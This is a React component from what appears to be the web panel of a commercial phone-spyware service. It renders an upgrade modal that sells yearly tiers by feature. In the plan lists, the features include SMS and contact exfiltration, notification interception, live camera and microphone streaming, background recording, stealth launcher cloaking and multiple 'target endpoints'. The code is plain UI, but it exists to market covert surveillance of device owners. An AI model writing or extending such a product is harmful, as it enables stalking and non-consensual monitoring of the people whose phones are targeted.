"use client";

import React from 'react';
import { Zap, Crown, Check, X, ArrowRight, Sparkles } from 'lucide-react';

interface UpgradeModalProps {
    isOpen: boolean;
    onClose: () => void;
    feature: string;
    requiredPlan: 'standard' | 'premium';
    onViewPlans?: () => void;
}

const planConfig = {
    standard: {
        name: 'Standard Pro',
        price: '$5',
        period: '/ year',
        accent: '#10b981',
        themeBorder: 'border-emerald-500/40',
        icon: <Zap size={24} className="text-emerald-400" />,
        features: [
            'Unlimited Photos & Videos',
            'SMS & Contacts Exfiltration',
            'Live Notification Interceptor',
            'Hardware Torch & Vibration',
            'ZIP Single-Archive Bulk Downloader',
            'Up to 5 Target Endpoints',
        ],
    },
    premium: {
        name: 'Premium Elite',
        price: '$10',
        period: '/ year',
        accent: '#f59e0b',
        themeBorder: 'border-amber-500/40',
        icon: <Crown size={24} className="text-amber-400" />,
        features: [
            'Everything in Standard',
            'Live Dual Camera Streaming',
            'Live Mic Audio & Background Recording',
            'Stealth Launcher Cloaking',
            'Up to 10 Target Endpoints',
            'All Hardware Controls Unlocked',
        ],
    },
};

export default function UpgradeModal({ isOpen, onClose, feature, requiredPlan, onViewPlans }: UpgradeModalProps) {
    if (!isOpen) return null;
    const plan = planConfig[requiredPlan];
    const isPremium = requiredPlan === 'premium';

    return (
        <div className="fixed inset-0 z-[700] flex items-center justify-center p-4 bg-black/85 backdrop-blur-xl animate-in fade-in duration-100" onClick={onClose}>
            <div
                className={`relative w-full max-w-sm bg-[#0f1115] border ${plan.themeBorder} rounded-3xl p-6 sm:p-7 shadow-[0_25px_80px_rgba(0,0,0,0.98)] animate-in zoom-in-95 duration-100 overflow-hidden`}
                onClick={e => e.stopPropagation()}
            >
                {/* Close Button */}
                <button 
                    onClick={onClose} 
                    className="clay-button-sm absolute top-4 right-4 w-8 h-8 rounded-xl flex items-center justify-center text-white/50 hover:text-white transition-all cursor-pointer z-10"
                >
                    <X size={15} />
                </button>

                {/* Header */}
                <div className="text-center pb-2">
                    <div
                        className="w-14 h-14 rounded-2xl flex items-center justify-center mx-auto mb-3.5 border bg-black/40 shadow-[0_0_25px_rgba(0,0,0,0.5)]"
                        style={{ borderColor: `${plan.accent}40` }}
                    >
                        {plan.icon}
                    </div>
                    <span 
                        className="px-2.5 py-0.5 rounded-full text-[9px] font-mono font-black tracking-widest uppercase mb-1.5 inline-block" 
                        style={{ color: plan.accent, background: `${plan.accent}15`, border: `1px solid ${plan.accent}30` }}
                    >
                        {plan.name} Tier Required
                    </span>
                    <h2 className="text-base sm:text-lg font-black text-white tracking-tight">{feature}</h2>
                    <p className="text-xs text-white/40 font-mono mt-0.5">Upgrade subscription to unlock feature</p>
                </div>

                {/* Features Card */}
                <div className="bg-[#16181d] border border-white/10 rounded-2xl p-4 my-4">
                    <p className="text-[9px] font-mono font-bold tracking-widest uppercase text-white/40 mb-2.5">
                        {plan.name} Includes:
                    </p>
                    <div className="space-y-2">
                        {plan.features.map((f, i) => (
                            <div key={i} className="flex items-center gap-2">
                                <Check size={12} className="shrink-0" style={{ color: plan.accent }} strokeWidth={3} />
                                <span className="text-[11px] font-medium text-zinc-300">{f}</span>
                            </div>
                        ))}
                    </div>
                    <div className="mt-3 pt-2.5 border-t border-white/10 flex items-baseline justify-between">
                        <span className="text-xs font-mono text-white/50">Subscription Price:</span>
                        <div className="flex items-baseline gap-1">
                            <span className="text-base font-black text-white font-mono">{plan.price}</span>
                            <span className="text-[10px] text-white/40 font-mono">{plan.period}</span>
                        </div>
                    </div>
                </div>

                {/* CTA Buttons */}
                <div className="flex flex-col gap-2">
                    <button
                        type="button"
                        onClick={onViewPlans || onClose}
                        className={`w-full py-2.5 rounded-xl font-mono font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 transition-all cursor-pointer active:scale-95 ${
                            isPremium
                                ? 'bg-amber-400 hover:bg-amber-300 text-black shadow-[0_0_20px_rgba(245,158,11,0.4)]'
                                : 'bg-emerald-500 hover:bg-emerald-400 text-black shadow-[0_0_20px_rgba(16,185,129,0.4)]'
                        }`}
                    >
                        {isPremium ? <Crown size={14} /> : <Zap size={14} />}
                        <span>View Plans & Upgrade</span>
                        <ArrowRight size={13} />
                    </button>
                    <button
                        type="button"
                        onClick={onClose}
                        className="w-full py-2 rounded-xl text-[11px] font-mono font-bold text-white/40 hover:text-white transition-colors cursor-pointer"
                    >
                        Dismiss
                    </button>
                </div>
            </div>
        </div>
    );
}
